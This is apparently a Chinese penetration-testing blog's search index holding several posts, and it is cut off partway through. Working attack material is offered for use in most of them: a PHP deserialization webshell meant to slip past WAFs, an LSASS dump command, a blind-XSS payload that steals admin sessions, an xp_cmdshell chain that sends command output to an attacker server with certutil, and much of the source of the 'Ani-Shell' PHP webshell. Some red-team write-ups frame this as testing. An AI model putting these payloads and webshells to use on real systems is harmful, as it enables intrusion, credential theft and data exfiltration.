<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[利用PHP反序列化免杀D盾、安全狗等WAF软件]]></title>
    <url>%2F2019%2F08%2F04%2F%E5%88%A9%E7%94%A8PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80D%E7%9B%BE%E3%80%81%E5%AE%89%E5%85%A8%E7%8B%97%E7%AD%89WAF%E8%BD%AF%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[bypasswaf-php PHP反序列化介绍： 在PHP进行反序列化时，会将序列化中的变量传入类中，并且调用__destuct等魔法函数。 TestCode1:1234567891011121314&lt;?phpclass A&#123; public $name = 'xxxx'; function __destruct()&#123; echo $this-&gt;name; &#125;&#125;echo serialize(new A());?&gt; 输出: xxxxO:1:“A”:1:{s:4:“name”;s:4:“xxxx”;} TestCode2:1234567891011121314&lt;?phpclass A&#123; public $name = 'xxxx'; function __destruct()&#123; echo $this-&gt;name; &#125;&#125;unserialize('O:1:"A":1:&#123;s:4:"name";s:9:"wogaosuni";&#125;');?&gt; 输出: wogaosuni 可以发现原来的变量已经被我们替换了。 利用反序列化写马绕过D盾等WAF：代码不做过多解释，啥子都能看明白 1234567891011121314&lt;?phpclass A&#123; public $name; public $male; function __destruct()&#123; $a = $this-&gt;name; $a($this-&gt;male); &#125;&#125;unserialize($_POST['un']);?&gt; POST传参传入 un=O:1:”A”:2:{s:4:”name”;s:6:”assert”;s:4:”male”;s:16:”eval($_GET[“x”])”;} GET传参传入: x=phpinfo(); 效果： 来源 0xNULL 论坛。 About 0xNULL sec 0xNULL sec是一个封闭的网络安全知识交流小聚集地，我们希望社区的人员相互扶持相互帮助。 我们致力于分享网络安全知识 参与技术问题讨论 推动网络安全进步。 作为专业的安全技术交流平台，0xNULL sec 无任何盈利与商业性质4.所有 0xNULL sec 大小事务，凡是有疑惑想与管理团队反馈的，请联系邮箱：0xNull.org@protonmail.com 0xNULL邀请码获得方式:请移步至0xNULL论坛查看注册贴或者请狂点我]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“净网2019”打击网络色情，实录渗透某成人“抖音”]]></title>
    <url>%2F2019%2F05%2F09%2F%E2%80%9C%E5%87%80%E7%BD%912019%E2%80%9D%E6%89%93%E5%87%BB%E7%BD%91%E7%BB%9C%E8%89%B2%E6%83%85%EF%BC%8C%E5%AE%9E%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E6%88%90%E4%BA%BA%E2%80%9C%E6%8A%96%E9%9F%B3%E2%80%9D%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红队故事0x02-从SQLi到Domain Admin]]></title>
    <url>%2F2018%2F11%2F04%2F%E7%BA%A2%E9%98%9F%E6%95%85%E4%BA%8B0x02-%E4%BB%8ESQLi%E5%88%B0Domain-Admin%2F</url>
    <content type="text"><![CDATA[对一个SQL注入引发的威胁进行思考。 背景介绍红队运营中包含的一项活动是搜索客户使用的软件中的漏洞，有时这项活动会发现0day。在一般情况下，漏洞是公开的，因此，我们只需要合理有效的利用。 在这篇文章中，我们将讨论一个已经被公开的漏洞(也就是指定的CVE)，但这个漏洞没有公开细节。我将描述在功能性利用之前所遵循的逆向工程过程。 最后，利用此漏洞导致我们能获取域的管理员凭据，如本文末尾所示。 应用过程0x01 – 序言通过对客户的不同IP地址块进行全面扫描, 发现对应于ManageEngine Applications Manager 应用程序的公开Web服务。这个应用程序允许管理和监控IT基础设施，这使其成为一个关键的资产，因此是红队的优先目标。 通过对应用程序版本(12900)进行琐碎的搜索，可以发现在2017年4月有人报告了一些关于该程序该版本的漏洞。在这些报告中，它强调了一个非常有趣的SQL注入(CVE-2016-9488)，因为它不需要身份验证。但是，易受攻击d额参数的详细信息以及当时利用的场景并没有完全公布，我们仅仅只知道易受攻击的应用程序组件(/servlet/MenuHandlerServlet)。 SQL注入（CVE-2016-9488） 未经身份验证的用户可以访问易受SQL注入攻击的URL /servlet/MenuHandlerServlet。请注意，攻击者除此之外还能够提取用户的密码Hash，这些Hash是没有salt的MD5Hash值。 根据使用的数据库类型及其配置，攻击者还可以使用SQL查询执行操作系统命令 。 0x02 – 识别SQL注入在缺乏信息的情况下，红队可以继续通过逆向工程分析应用程序，以识别易受攻击的参数，并找出如何利用它。为此，我们使用制造商在其网站上提供的demo，尽管它是最新版本且已经修复了该漏洞，但我们仍然可以研究之前受影响组件接收的参数。 解压缩包含类MenuHandlerServlet（易受攻击资源的名称）的.jar文件。在这种情况下，我通常使用jad具对此类进行反编译，以通过ServletRequest.getParameter（）方法执行搜索来查找现有HTTP参数。 在对不同的参数进行了不同的测试之后，可以确定config_id参数是受SQL注入影响的参数，如下所示。 0x03 – 数据提取确定了可以注入的参数之后，我们再对其数据库(PostgreSQL)结构进行分析，以便我们提取。此时的目标是获取允许访问平台的管理凭据。 首先找到表am_userpasswordtable，从中获取应用程序的用户列表以及在没有salt的MD5中找到的密码。 credentialdetails表获取到了用于监视不同服务(Tomcat、Apache、数据库)的应用程序凭证(其中许多是域)。 在这种情况下，密码是被加密过的。但是，验证应用程序中有一个执行解码的函数（convertFromBase（String paramString）），用于获取明文。 0x04 – 对应用程序的最终访问权限在逆向工程的过程中，在我们的hash破解完成之前，又发现了制造商在其中设置了默认密码(admin/admin)，可以进入控制面板。但是，如果应用程序与其它产品OpManager）集成，则采用不同的值。 0x05 – 获取域管理员凭据进入应用程序后，我将验证管理面板中是否存在允许本地和远程执行命令的组件（操作）。虽然此组件不返回已执行命令的输出，但可以将输出转储到文件并使用应用程序本身的日志查看器查看。确定命令是以 NT AUTHORITY \ SYSTEM 权限执行。 另外，我发现管理面板允许将文件上传到服务器。此功能用于在服务器（Windows）上承载sysinternals的ProcDump实用程序。此实用程序用于将LSASS进程的内存转储到文件中，这可能是由于缺少对内存访问的安全限制导致的。 procdump.exe -accepteula -ma lsass.exe out 此文件被渗透到此次目标的本地计算机中，以便之后提取域用户的密码，获取对域管理员帐户的访问权限。 结论在一个暴露于互联网的web应用程序中，一个漏洞可能会导致公司基础设施被入侵。出于这个原因，重要的是要考虑避免暴露关键平台的必要性，例如本文中所示的平台。 在必要的情况下，必须及时更新应用程序，对服务器的外围和基础进行防御，并定期对漏洞进行审计。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Red Team</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科普文-blind xss]]></title>
    <url>%2F2018%2F10%2F05%2F%E7%A7%91%E6%99%AE%E6%96%87-blind%20xss%2F</url>
    <content type="text"><![CDATA[Blind XSS 是 cross site scripting (XSS)攻击的一个子方向 About Blind XSS在这篇文章中，你将了解到什么是blind xss以及几种测试方法。在web应用程序评估期间，我们通过在应用程序的某个地方注入有效负载来测试XSS。一般情况下，我们在网站的评论部分，参数，标题等位置进行测试。大多数时候，在测试XSS时，我们会以 “弹框”的方法来测评。 但是，如果我们没有看到弹出窗口怎么办？这是否意味着该网站此位置不存在XSS漏洞攻击呢？答案显然不是。当我们注入有效负载时，Web应用程序可能会将其存储在我们无法访问的位置,例如:在数据库，日志文件，相同或者不同应用程序的其他区域中。 作为测试人员，我们可能不知道有效负载是否存储或存储的位置。我们也不知道何时可以访问特定功能。 我将进行一次快速的演示。此次演示将使用Wordpress程序以及易受blind XSS攻击的插件(Count per Day)。注:该漏洞已被修复。 通过这个插件，我们可以跟踪引用头，并将信息存储在一个名为wp_cpd_counter的表中。如下面的截图所示，我们的设置表当前为空。 将JavaScript注入到referrer头中。但就像上面提到的，这个操作不会”弹框”，所以我们无法判断是否被存储，但一定要记住，是否被存储≠不存储(我们不讨论该漏洞的形成过程)。每天的计数跟踪referrer头信息，它会存储在数据库中。在管理员查看用户统计信息之前，JavaScript不会真正执行。 如果应用程序受到了此攻击,则有效负载将到达我的服务器并执行sploit.js，其中包含以下JavaScript。 在服务器端，我使用python设置一个简单的Web服务器来监听请求并托管sploit.js脚本。 如果只需要证明应用程序容易受到盲目的XSS攻击，那么我们只需等待web服务器记录请求即可。在该演示中，我将使用sploit.js窃取管理会话ID。 该图显示sploit.js正在执行并获取管理员的PHP会话ID。当管理员访问Wordpress管理部分中每个插件的计数时，都会发生这种情况。 在该演示过程中，我们可以完全控制管理和攻击方。但是作为测试人员，可能无法控制web应用程序的所有领域。这就是我们有时会错过对blind XSS的测试原因。 Python Blind XSS Script为了好玩，我编写了一个python脚本来监听HTTPS的传入连接、发送电子邮件并将详细信息记录在日志文件中。使用该脚本，你需要使用openssl为https生成密钥和crt文件。我在脚本中添加了关于如何生成密钥和crt文件的注释: 1openssl req -newkey rsa:2048 -nodes -keyout newkey.key -x509 -days 365 -out newcert.crt 如果使用电子邮件，还需要添加SMTP凭证。 调整好脚本之后，只需运行: 1python3 blind_xss_server.py 在客户端，我们需要注入一个有效负载，例如: 1&lt;script src=//DOMAIN:4443/BxXxSxS&gt;&lt;/script&gt; 然后查看日志文件并监视电子邮件警报即可。 该脚本可以在以下链接中找到:https://github.com/quyunjie/Red-Team/blob/master/scripts/blind_xss_server.py]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>科普文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红队故事0x01:从MSSQL到命令执行]]></title>
    <url>%2F2018%2F09%2F16%2F%E7%BA%A2%E9%98%9F%E6%95%85%E4%BA%8B0x01-%E4%BB%8EMSSQL%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[从一个MSSQL再到命令执行的思考。 背景介绍红队识别出了一个易受SQL注入攻击的外围资产(ASP/MSSQL)。通过此漏洞有可能在目标服务器上执行命令，但需要特殊的方法绕过命令过滤策略，从而获得命令的输出。 应用过程0x01 – 堆叠查询其中所涉及的环境是一个使用Microsoft SQL Server作为数据库的ASP应用程序。 漏洞的发现因为在插入单引号(‘)时，页面上会显示ODBC驱动程序缺少结束引号。多次尝试SQL查询或表达式(例如:使用“+”运算符连接)，都是失败的，我们认为注入点是存储过程中调用的一个参数。为了验证这一点，我们尝试通过注入逗号来引入新的参数，这会因为参数过多而引起错误。 正如官方文档所规定的，存储过程的参数必须是常数或变量。因此我们无法使用典型的Union联合注入或盲注。替代方法:使用堆叠注入，默认情况下ASP/MSSQL是支持堆叠注入的。 堆叠注入堆叠注入:在执行一次查询时，通过分号(;)字符分隔，执行两条或更多的SQL语句。因此，我们可以使用基于时间的盲注从数据库中获取到信息: 但在这种情况下，Web应用程序没有权限查询更多的关键信息。因此我们继续研究别的方法，例如:命令执行。 命令执行在MSSQL中，有一个常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回。但问题是，在这样的场景中，输出是永远不会被转储给用户，也就是说用户是看不到返回的结果的。因此，要验证命令是否正确执行，可以使用Windows中的默认实用程序: certutil.exe。 这个命令最初是用来管理证书的，但对红队的工作有很大的帮助，原因有很多: 它是由Microsoft默认安装的二进制文件。 它允许建立HTTP/s连接并且是proxy-aware(使用系统中配置的代理)。 它允许在Base64或十六进制中编码/解码。 在我们的场景中，我们运用它向我们控制的web服务器发出HTTP/s请求，确认我们的命令是否被执行。 1‘;EXEC xp_cmdshell ‘certutil.exe -urlcache -f http://example.com’ 虽然最常见的是应用程序的用户没有权限来执行存储过程xp_cmdshell (默认禁用)，但由于配置错误，我们可以激活它。在这种情况下，使用以下查询来激活: 123456exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; exec sp_configure 'show advanced options', 0; reconfigure; 或 12EXEC sp_configure 'show advanced options', 1 ; reconfigure; EXEC exec sp_configure 'xp_cmdshell', 1 ; reconfigure; 至此, ，我们已经可以看到如何绕过命令过滤策略，获得命令的输出。 0x02 - 传送数据的加密/解密此时，我们已经可以执行系统命令，并向我们控制的Wbe服务器发出HTPP/s请求。综合以上两点，我们就可以通过https://redteam/[informacion_code]来获取信息。在这种情况下，我们选择Bsae64编码而不是十六进制，因为我们需要数据库允许我们以更少的字符存储更多的信息。 我们应该遵循以下几点: 1.声明一个“表”类型的变量，让返回的结果保存在存储过程xp_cmdshell中(记住，返回的结果是多行的)。 2.将命令的输出结果存储到上一个变量中。 3.连接“表”的SQL语句，用换行符分割。 4.将生成的字符串编码为Base64，并将其保存在一个变量中。 5.生成certutil命令，将字符串添加到结果中。 6.执行 在T-SQL中没有办法直接执行第三步和第四步，但有两个小技巧来解决这个问题: 无法使用MySQL的group_concat函数，因此所有字符串的连接都使用FOR XML子句。这样，就可以以单个字符串(XML)的形式获取数据。 1SELECT columna+char(10) as 'text()' FROM tabla FOR XML path('') -- Se concatena un salto de linea al final de cada fila - char(10) 另一方面，也没有方法直接将字符串转换为Base64，但可以将Base64转换成二进制数据。因此，解决方案是将之前的字符串转换成二进制数据: 1SELECT cast('tarlogic' AS varbinary(max)) FOR XML path(''), BINARY BASE64 实现这一编码，还有其他的选择，比如使用XQuery。 将所有的步骤放在一起就会发现和T-SQL十分的相似: 12345678910declare @r varchar(4120),@cmdOutput varchar(4120);declare @res TABLE(line varchar(max));insert into @res exec xp_cmdshell 'COMANDO';set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);exec xp_cmdshell @r; 在读取包含命令结果的表的过程中，我们需要考虑到排序规则。 此外，在解码Base64时必须考虑到在Windows中命令的输出将以Unicode方式表示。 0x03 - 自动化这个过程被我们成功的实现了一遍，所以我们可以让它自动化的执行。为此，开发了一种工具，它为用户提供了一个提示符。然后，它生成必要的负载来运行它，同时部署一个可以接收结果的web服务器。最后，自动解码并显示出来。 该工具的代码作为概念测试，可在以下链接中找到: https://github.com/quyunjie/Red-Team/blob/master/mssql-rce/mandros.py 结论我们已经看到，没有对外围资产进行关键的信息处理的结果，就是它让红队能够将其转变为目标的内部网络。因此，重要的是要考虑到对这种类型漏洞的过滤强化和预警，而不仅仅是对漏洞的定期审计。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Red Team</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全圈怪象]]></title>
    <url>%2F2018%2F09%2F14%2F%E5%AE%89%E5%85%A8%E5%9C%88%E6%80%AA%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[“当初安全行业根本没有SRC的概念，自己也不混SRC，现在互联网公司基本都有了自己的SRC。当初学信息安全学挖漏洞也完全是兴趣使然，只是单纯的喜欢，不为赚钱。现在挖漏洞成了白帽子的赚钱方式。安全行业当初也没有这样浮躁，大家都比较喜欢低调的潜心学习。现在一些人挖到几个高危漏洞就觉得自己很了不起，各种榜单、各种会议、各种刷名气，不惜造假、吹牛营销自己。”这句话是出自一位好友。 是啊，到现在研究安全十年有余，虽不见得有多厉害，但的确如我好友所说，当初学习仅仅只是兴趣使然，而不是像现在这样，追求名利。 之前有一个位朋友说她所理解的安全和我的理解貌似有很大的出入，我对她说：你们是国家科技的中流砥柱，而我们是地下世界的王者，只是这样的区别而已。毕竟殊途同归，有心的人自然会以追求技术为目的。 想了想，自己是没有资格评判别人的，我也只是把我心中所想的表达出来，这就足够了，再然后就是继续沉潜学习，争取能为这个圈子贡献出自己一丝丝薄弱的力量，毕竟这仅仅只是一种情怀。 若以上言论有所得罪，请多多饶恕。]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2.信息收集类网站]]></title>
    <url>%2F2018%2F09%2F14%2F2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[了解常用的信息收集类网站 在这篇文章中，我将介绍一些免费的能快速帮助我们收集信息的网站给大家。 1.netcraft该网站向我们提供了服务器的详细信息，其中包括了有关服务器上运行的内容以及IP，whois信息等。所有这些信息都应该保存在我们的报告中，以便我们可以使用这些信息来定义攻击面，这是一个最重要的部分。 2.webscan像之前讲到的，很多时候，我们所针对的域名并没有我们可以利用的入侵点，或者我们无法找到正确的攻击点，在这种情况下，我们可以进行反向IP域查找并找到服务器上可能容易受到攻击的其他域。 3.archive.org（需翻墙）Archive.org是一个存储着许多站点历史快照的网站。 很多时候，由于某些原因，比如:更新换代等。我们可以利用此网站获得一些在网站上不再显示的信息。 4.微步在线同样能查到很多信息，例如：whois信息，历史解析记录，当前IP信息等等。可以为我们在信息收集这一步骤提供很大的便利！ 5.Robots.txtRobots.txt是一个大部分网站都会存在的文件，网站使用该文件禁止抓取工具（爬虫等）抓取部分敏感数据或管理面板。 如果它可以公开查看，我们在这里找到的信息内容，对之后的工作可能会有大用处。 善于利用各类在线网站，对我们信息收集的工作是有巨大好处的！]]></content>
      <categories>
        <category>知识框架</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.信息收集的目的]]></title>
    <url>%2F2018%2F09%2F14%2F1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%9B%AE%E7%9A%84%2F</url>
    <content type="text"><![CDATA[了解信息搜集 我们为什么要进行信息收集？在开始测试或攻击网站之前信息收集的目的是什么? 我现在举一个小小的例子:假如我们大家要出去露营，我们需要先弄清楚那里的环境怎么样，有些什么东西，就比如说有个小池子，里面有鱼，那我们可以钓鱼，但是钓鱼我们又需要准备什么呢？ 同样，Web测试也很类似于此。当你要对一个网站进行测试的时候，你必须知道你真正要面对的是什么。如果你知道你要面对的是怎么样的目标，那么你就可以做好准备。 所以这就是“为什么信息收集是渗透测试的第一阶段”。但现在的问题是我们要收集哪些信息以及我们将从哪里获取这些信息。在接下来的讲解中，我将一步一步地告诉你这两点。 但在这篇文章中，我们会讲到我们通过信息收集所要达到的目标以及这些信息将如何帮助我们进行渗透测试。 Who is 信息: 这是关于域名的最基本信息，它显示了网站的注册详细信息，你可以在其中查看注册域名的用户以及该域名的到期时间等。此信息可能在“社会工程”中对你的帮助很大，比如给域名留下的邮箱发邮件或者在社会工程的各种需求中使用他的地址，姓名或联系电话等。 IP地址:实际上IP地址是任何域名背后的真实地址，它是由域名服务器解析的。IP地址将帮助我们定位网络，并在测试时查找系统上的开放端口和其他可利用的服务。 域名解析服务器(NameServers): 这些是DNS解析器，例如，当你在浏览器中输入baidu.com时，DNS解析器会找到真正的IP并将你的请求发送到服务器，并返回响应。 Web服务器:我在这里所说的Web服务器是一个运行在操作系统上的应用程序。像Apache、Tomcat、IIS等是运行在操作系统上的web服务器，当任何web请求被发送到系统时，它们会处理它，并负责发出响应。如果我们知道了目标使用的是什么Web服务器，那么我们可以找到该Web服务器的默认目录或已知漏洞。 登陆页面:实际上找到登陆界面或者管理员登陆页面其实是很简单的事，就像找到一间房子的门一样，但是，你想要进去这座房子，你只有打开钥匙，要么你有万能钥匙，要么你会撬锁，要么你可以直接把锁给摧毁！ 子域名：直接来举个例子，现在已知域名为:baidu.com，那么它的其中一个子域名为:mail.baidu.com。我们需要收集网站的所有可用子域名。 在许多情况下，我们可能会发现隐藏或私有域，他们正在维护某些私有域，并且由于很少人可以接触到这些应用程序，因此这些应用程序通常会容易受到攻击。 Web应用程序：很多时候你所针对的是像Joomla，Wordress或任何其他开源的Web应用程序。 我们还需要获取有关Web应用程序的所有信息，以便我们可以找到该特定版本的任何已知漏洞。 同一服务器上的其他域:很多时候我们没有办法在目标站中找到漏洞，因此可以查找反向IP域并查找同一服务器上的其他网站。 Web应用程序防火墙：我们还可以测试他们有没有使用任何防火墙，这样我们就可以知道我们将面对什么，是否有任何方法可以绕过该防火墙。 这些都是我们尝试收集目标信息的一些常见方法]]></content>
      <categories>
        <category>知识框架</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[当webshell不可执行cmshell时 （菜刀的安全模式!）可用此脚本突破执行cmd命令]]></title>
    <url>%2F2018%2F02%2F22%2F%E5%BD%93webshell%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8Ccmshell%E6%97%B6-%EF%BC%88%E8%8F%9C%E5%88%80%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%BC%8F-%EF%BC%89%E5%8F%AF%E7%94%A8%E6%AD%A4%E8%84%9A%E6%9C%AC%E7%AA%81%E7%A0%B4%E6%89%A7%E8%A1%8Ccmd%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[当webshell不可执行cmshell时（菜刀的安全模式!）你可以尝试用此脚本突破执行cmd命令，其实出的时间很久了，但可以尝试一下lt;?php/*==============*/error_reporting(0);ini_set('max_execution_time',0);// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\/**************** Defines *********************************/$user = "anlfi";$pass = "XXX";$sm = @ini_get('safe_mode');$SEPARATOR = '/'; // Default Directory separator$os = "N/D";if(stristr(php_uname(),"Windows"))&#123; $SEPARATOR = '\\'; $os = "Windows";&#125;else if(stristr(php_uname(),"Linux"))&#123; $os = "Linux";&#125;//*************************************************************/// -------------- Traceback Functionsfunction sendLoginAlert()&#123; global $ownerEmail; global $url; $accesedIp = $_SERVER['REMOTE_ADDR']; $randomInt = rand(0,1000000); # to avoid id blocking $from = "ani-shell$[email]randomInt@fbi.gov[/email]"; //echo $from; if(function_exists('mail')) &#123; $subject = "Shell Accessed -- Ani-Shell --"; $message = "Hey Owner , Your Shell(Ani-Shell) located at $url was accessed by $accesedIp If its not you :- 1. Please check if the shell is secured. 2. Change your user name and Password. 3. Check if lock is 0n! and Kick that ****** out! Thanking You Yours FaithfullyAni-Shell "; mail($ownerEmail,$subject,$message,'From:'.$from); &#125;&#125;//---------------------------------------------------------if(function_exists('session_start') &amp;&amp; $lock == 'on')&#123; session_start();&#125;else&#123; // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported $lock = 'off';&#125;//logoutif(isset($_GET['logout']) &amp;&amp; $lock == 'on')&#123; $_SESSION['authenticated'] = 0; session_destroy(); header("location: ".$_SERVER['PHP_SELF']);&#125;ini_set('max_execution_time',0);/***************** Restoring *******************************/ini_restore("safe_mode");ini_restore("open_basedir");if(function_exists('ini_set'))&#123; ini_set('error_log',NULL); // No alarming logs ini_set('log_errors',0); // No logging of errors&#125;else&#123; ini_alter('error_log',NULL); ini_alter('log_errors',0);&#125;// ----------------------------------------------------------------------------------------------------------------?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;cmd Shell by:anlfi&lt;/title&gt;&lt;style&gt;/*========================== CSS Section==========================*/*&#123; padding:0; margin:0;&#125;.alert&#123; background:red; color:white; font-weight:bold;&#125;td.info&#123; width:0px;&#125;.bind &#123; border: 1px solid #333333; margin: 15px auto 0; font-size: small;&#125;div.end *&#123; font-size:small;&#125;div.end &#123; width:100%; background:#222;&#125;p.blink&#123; text-decoration: blink;&#125;body &#123; background-color:black; color:rgb(35,182,39); font-family:Tahoma,Verdana,Arial; font-size: small;&#125;input.own &#123; background-color: Green; color: white; border : 1px solid #ccc;&#125;blockquote.small&#123; font-size: smaller; color: silver; text-align: center;&#125;table.files&#123; border-spacing: 10px; font-size: small;&#125;h1 &#123; padding: 4px; padding-bottom: 0px; margin-right : 5px;&#125;div.logo&#123; border-right: 1px aqua solid;&#125;div.header&#123; padding-left: 5px; font-size: small; text-align: left;&#125;div.nav&#123; margin-top:1px; height:30px; background-color: #ccc;&#125;div.nav ul&#123; list-style: none; padding: 4px;&#125;div.nav li&#123; float: left; margin-right: 10px; text-align:center;&#125;textarea.cmd&#123; border : 1px solid #111; background-color : green; font-family: Shell; color : white; margin-top: 10px; font-size:small;&#125;input.cmd&#123; background-color:black; color: white; width: 400px; border : 1px solid #ccc;&#125;td.maintext&#123; font-size: large;&#125;#margins&#123; margin-left: 10px; margin-top: 10px; color:white;&#125;table.top&#123; border-bottom: 1px solid aqua; width: 100%;&#125;#borders&#123; border-top : 1px solid aqua; border-left:1px solid aqua; border-bottom: 1px solid aqua; border-right: 1px solid aqua; margin-bottom:0;&#125;td.file a , .file a&#123; color : aqua; text-decoration:none;&#125;a.dir&#123; color:white; font-weight:bold; text-decoration:none;&#125;td.dir a&#123; color : white; text-decoration:none;&#125;td.download,td.download2&#123; color:green;&#125;#spacing&#123; padding:10px; margin-left:200px;&#125;th.header&#123; background: none repeat scroll 0 0 #191919; color: white; border-bottom : 1px solid #333333;&#125;p.warning&#123; background : red; color: white;&#125;//--------------------------------CSS END------------------------------------------------------*/&lt;/style&gt;&lt;/head&gt;&lt;body text="rgb(39,245,10)" bgcolor="black"&gt;&lt;?phpif(isset($_POST['user']) &amp;&amp; isset($_POST['pass']) &amp;&amp; $lock == 'on')&#123; if( $_POST['user'] == $user &amp;&amp; $_POST['pass'] == $pass ) &#123; $_SESSION['authenticated'] = 1; // --------------------- Tracebacks -------------------------------- if($tracebackFeature == 'On') &#123; sendLoginAlert(); &#125; // ------------------------------------------------------------------ &#125;&#125;if($lock == 'off')&#123;?&gt; &lt;p class="warning"&gt;&lt;b&gt;Lock is Switched Off! , The shell can be accessed by anyone!&lt;/b&gt;&lt;/p&gt;&lt;?php&#125;if($lock == 'on' &amp;&amp; (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )&#123;?&gt;&lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td width="500px"&gt; &lt;pre&gt;&lt;font color="Orange"&gt;&lt;b&gt;[]--------------cmd Shell-----------------&lt;/b&gt;&lt;/pre&gt; &lt;/td&gt; &lt;td&gt; &lt;!-- &lt;h1&gt;&lt;?php // echo $greeting;?&gt;&lt;/h1&gt; &lt;img src="Logo_03.png" class="imageForm" /&gt; --&gt; &lt;form method="POST" action="&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"&gt; &lt;input name="user" value="Username"/&gt; &lt;input name="pass" type="" value=""/&gt; &lt;input class="own" type="Submit" value="in!"/&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;?php&#125;//---------------------------------- We are authenticated now-------------------------------------//Launch the shellelse &#123; //---------------------------------- Fuctions --------------------------------------------------- function showDrives() &#123; global $self; foreach(range('A','Z') as $drive) &#123; if(is_dir($drive.':\\')) &#123; ?&gt; &lt;a class="dir" href='&lt;?php echo $self ?&gt;?dir=&lt;?php echo $drive.":\\"; ?&gt;'&gt; &lt;?php echo $drive.":\\" ?&gt; &lt;/a&gt; &lt;?php &#125; &#125; &#125; function HumanReadableFilesize($size) &#123; $mod = 1024; $units = explode(' ','B KB MB GB TB PB'); for ($i = 0; $size &gt; $mod; $i++) &#123; $size /= $mod; &#125; return round($size, 2) . ' ' . $units[$i]; &#125;function getClientIp()&#123; echo $_SERVER['REMOTE_ADDR'];&#125;function getServerIp()&#123; echo getenv('SERVER_ADDR');&#125;function getSoftwareInfo()&#123; echo php_uname();&#125;function diskSpace()&#123; echo HumanReadableFilesize(disk_total_space("/"));&#125;function freeSpace()&#123; echo HumanReadableFilesize(disk_free_space("/"));&#125;function getSafeMode()&#123; global $sm; echo($sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF"); &#125;function getDisabledFunctions()&#123; if(!ini_get('disable_functions')) &#123; echo "None"; &#125; else &#123; echo @ini_get('disable_functions'); &#125;&#125;function getFilePermissions($file)&#123; $perms = fileperms($file);if (($perms &amp; 0xC000) == 0xC000) &#123; // Socket $info = 's';&#125; elseif (($perms &amp; 0xA000) == 0xA000) &#123; // Symbolic Link $info = 'l';&#125; elseif (($perms &amp; 0x8000) == 0x8000) &#123; // Regular $info = '-';&#125; elseif (($perms &amp; 0x6000) == 0x6000) &#123; // Block special $info = 'b';&#125; elseif (($perms &amp; 0x4000) == 0x4000) &#123; // Directory $info = 'd';&#125; elseif (($perms &amp; 0x2000) == 0x2000) &#123; // Character special $info = 'c';&#125; elseif (($perms &amp; 0x1000) == 0x1000) &#123; // FIFO pipe $info = 'p';&#125; else &#123; // Unknown $info = 'u';&#125;// Owner$info .= (($perms &amp; 0x0100) ? 'r' : '-');$info .= (($perms &amp; 0x0080) ? 'w' : '-');$info .= (($perms &amp; 0x0040) ? (($perms &amp; 0x0800) ? 's' : 'x' ) : (($perms &amp; 0x0800) ? 'S' : '-'));// Group$info .= (($perms &amp; 0x0020) ? 'r' : '-');$info .= (($perms &amp; 0x0010) ? 'w' : '-');$info .= (($perms &amp; 0x0008) ? (($perms &amp; 0x0400) ? 's' : 'x' ) : (($perms &amp; 0x0400) ? 'S' : '-'));// World$info .= (($perms &amp; 0x0004) ? 'r' : '-');$info .= (($perms &amp; 0x0002) ? 'w' : '-');$info .= (($perms &amp; 0x0001) ? (($perms &amp; 0x0200) ? 't' : 'x' ) : (($perms &amp; 0x0200) ? 'T' : '-'));return $info;&#125;/***********************************************************/// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is// Turned OfF!/**********************************************************/function exec_all($command)&#123; $output = ''; if(function_exists('exec')) &#123; exec($command,$output); $output = join("\n",$output); &#125; else if(function_exists('shell_exec')) &#123; $output = shell_exec($command); &#125; else if(function_exists('popen')) &#123; $handle = popen($command , "r"); // Open the command pipe for reading if(is_resource($handle)) &#123; if(function_exists('fread') &amp;&amp; function_exists('feof')) &#123; while(!feof($handle)) &#123; $output .= fread($handle, 